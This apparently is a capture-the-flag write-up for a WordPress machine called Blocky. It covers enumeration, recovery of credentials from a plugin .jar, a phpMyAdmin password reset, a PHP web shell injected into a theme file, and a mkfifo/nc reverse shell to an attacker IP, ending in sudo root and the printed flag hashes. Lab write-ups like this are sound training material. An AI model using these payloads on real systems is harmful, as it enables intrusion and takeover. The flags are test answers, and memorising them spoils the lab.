#box #wordpress #WebShell #ReverseShell #os-command-injection 
## Nmap

Scanning with namp we discover that the usual `-sC -sV` commands are not working since it feels something is blocking us. Thus we try performing the scan without them maintaining `--min-rate=10000` and discover the following:

```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-03 16:11 UTC
Nmap scan report for 10.129.100.206
Host is up (0.034s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT     STATE  SERVICE
21/tcp   open   ftp
22/tcp   open   ssh
80/tcp   open   http
8192/tcp closed sophos

Nmap done: 1 IP address (1 host up) scanned in 0.61 seconds
```

We validate our theory since there's a Sophos service running on 8192 that is very likely blocking us from scanning in-depth the open ports. 
## :80

We discover the presence of a website resolving a domain to `blocky.htb` which we add in `/etc/hosts` to properly load the page.
Once the page is loaded we find out a website recalling a minecraft server. By going below we discover that the website seems to be hosted on a WP instance.
We instantly try to solve `blocky.htb/wp-admin` finding successfully the login page for the administration panel


-- Discovered user `Notch` on the open API list on http://blocky.htb/index.php/wp-json/

We enumerate `http://blocky.htb/FUZZ` with `/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt` and we discover the presence of a few interesting endpoints:
```bash

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://blocky.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

wiki                    [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 49ms]
wp-content              [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 46ms]
plugins                 [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 48ms]
wp-includes             [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 37ms]
javascript              [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 50ms]
wp-admin                [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 46ms]
phpmyadmin              [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 64ms]
server-status           [Status: 403, Size: 298, Words: 22, Lines: 12, Duration: 47ms]
```

Specifically: 
* plugins
* phpmyadmin
Both of those two endpoints are reachable, the `plugins` one contains two files hosted which can be downloaded. It consists in two `.jar` files. While the latter consists in the login page of `phpmyadmin`.
We download, at first, the files and we unzip them with `unzip {filename}`. Inside the `BlockyCore.jar` archive we discover the presence of a class into `/com/myfirstplugin/BlockyCore.class`. Inside of that class file we discover a couple of suspicious strings which could be classifiable as credentials. If we `cat` the file, we end up seeing the following:

![[attachments/blocky-writeup-1.webp]]

We then try to authenticate by chance on `phpmyadmin` login page with: `root:8YsqfCTnvxAUeduzjNSXe22`, succeeding.

### PhpMyAdmin

Inside PHPMyAdmin we wander and try to look for potential credentials to access on the wordpress instance and find out the table `wordpress.wp_users` which shows the user `notch` and its encrypted password, we also have its user_email, in case we'll need that later.
**Credentials**:
* Username: `notch`
* Password: `notch@blockcraftfake.com`
* Email: `$P$BiVoTj899ItS1EZnMhqeqVbrZI4Oq0/`

Looking online we try to discover in which format this encrypted password might be in. We discover that it can be MD5 (WP, Joomla) but however we haven't been unable to decrypt it with rockyou.
We decide to change the password in the database to authenticate as the user specified and after changing it and encrypting it in MD5 we finally are able to authenticate with the user. (for the current pentest we changed the password to `pass123`).

>It's required to add a password and add the encryption method to MD5, more on it [here](## Add WordPress Admin)

We're now able to authenticate to WP Admin Panel as `notch:pass123`.
### Wordpress Administration Panel - Getting a Shell

From Wordpress, we can actually access a given theme and edit a php file to try get a shell.
To do so, we edit the file `header.php` or whatever php file is then rendered in the app, we can understand so by reading the `front-page.php` file for instance and understand which file is recalled through the php functions (i.e. `get_header()` or `get_footer()`) and we then inject a command injection command:

```php
echo system($_REQUEST[cmd]);
```

Once done so, we can perform the following injection `http://blocky.htb/?cmd=ls` in the app and discover the possibility to inject a command of choice in the webpage.
At this point, within Burp we try to get a shell on the machine:

```request
GET /?cmd=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/bash+-i+2>%261|nc+10.10.16.35+1337+>/tmp/f HTTP/1.1
Host: blocky.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: wp-settings-time-1=1743953227; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_cf9a7b574098cead46761381d5c65ac4=Notch%7C1744124186%7CQ5fLtCJke9cr9flAwQvl9q8wv5IVHvlR4ufTj3gphbL%7C6b6f096b33fdaac69cd984b75cb18dce37e29a9d951bcdbe6c3cd1c55ae2cc6e
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

Command: `/?cmd=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/bash+-i+2>%261|nc+10.10.16.35+1337+>/tmp/f`
And in this case we get a shell as `www-data`

![[attachments/blocky-writeup-2.webp]]
From here, since we know the existence of phpmyadmin on the machine, we check the `/etc/phpmyadmin` folder in search for important files. We find `config-db.php` showing us a password `8YsqfCTnvxAUeduzjNSXe22`, recalling the same password found in the Jar file.
### SSH - Logging as notch, the machine's user

The password identified in the `.jar` or found in the `config-db.php` file can be used to authenticate as `notch`.
We can either authenticate to ssh with `ssh notch@10.129.26.219` or, alternatively, by doing `su - notch` if we're already authenticated as `www-data` on the machine.
User: `7b95a6369bb74a1d302125b4767441da`
Once logged as notch, we can `sudo -l` to discover the capabilities of our user, and we can run it as sudo since we have user's password. We discover that the user can run **any** command as sudo.![[attachments/blocky-writeup-3.webp]]
That means we can basically get the root by running `sudo su`.
Root: `a3cd05804f99fc4f8329a0740943a411`